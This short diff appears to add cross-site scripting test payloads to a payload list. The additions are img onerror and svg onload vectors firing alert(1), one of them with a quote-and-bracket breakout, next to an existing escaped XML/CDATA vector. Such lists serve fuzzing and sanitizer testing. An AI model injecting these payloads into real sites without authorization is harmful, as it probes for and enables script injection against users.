@@ -1,1 +1,4 @@
+<img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+<svg/onload=alert(1)
 &lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=x onerror=alert('XSS')&gt;&#93;&#93;&gt;
